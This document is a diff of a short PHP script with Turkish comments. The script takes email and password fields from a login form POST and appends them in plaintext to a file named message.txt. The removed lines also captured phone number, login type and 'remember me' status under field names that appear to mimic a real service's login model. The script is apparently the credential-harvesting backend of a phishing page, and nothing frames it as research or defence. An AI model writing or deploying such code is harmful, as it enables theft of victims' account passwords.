@@ -1,28 +1,19 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Formdan gelen verileri al
-    $email = $_POST['LoginModel.Email'] ?? 'E-posta bulunamadı';
-    $password = $_POST['LoginModel.Password'] ?? 'Şifre bulunamadı';
-    $phone = $_POST['LoginModel.Phone'] ?? 'Telefon numarası bulunamadı';
-    $loginType = $_POST['CustomerLoginType'] ?? 'Bilgi yok';
-    $isPersistent = isset($_POST['LoginModel.IsCreatePersistentCookie']) ? 'Evet' : 'Hayır';
+    // Formdan gelen e-posta ve şifre verilerini al
+    $email = $_POST['email'];
+    $password = $_POST['password'];
 
-    // Dosyayı aç veya oluştur
+    // Veriyi "message.txt" dosyasına kaydet
     $file = 'message.txt';
+    
+    // Dosyaya e-posta adresini ve şifreyi yaz
+    // FILE_APPEND: Mevcut verinin üzerine ekler, LOCK_EX: Eşzamanlı işlemlerden korur
+    file_put_contents($file, "Gönderilen E-posta: " . $email . "\nGönderilen Şifre: " . $password . "\n\n", FILE_APPEND | LOCK_EX);
 
-    // Yazılacak içerik
-    $content = "Giriş Bilgileri:\n";
-    $content .= "E-Posta: " . $email . "\n";
-    $content .= "Şifre: " . $password . "\n";
-    $content .= "Telefon: " . $phone . "\n";
-    $content .= "Giriş Yöntemi: " . $loginType . "\n";
-    $content .= "Beni Hatırla: " . $isPersistent . "\n";
-    $content .= "----------------------------\n";
-
-    // Dosyaya ekle
-    file_put_contents($file, $content, FILE_APPEND | LOCK_EX);
-
-    // Başarı mesajı veya yönlendirme
+    // Kullanıcıya geri bildirim
     echo "Veriler başarıyla kaydedildi.";
+} else {
+    echo "Form verisi gönderilmedi.";
 }
 ?>
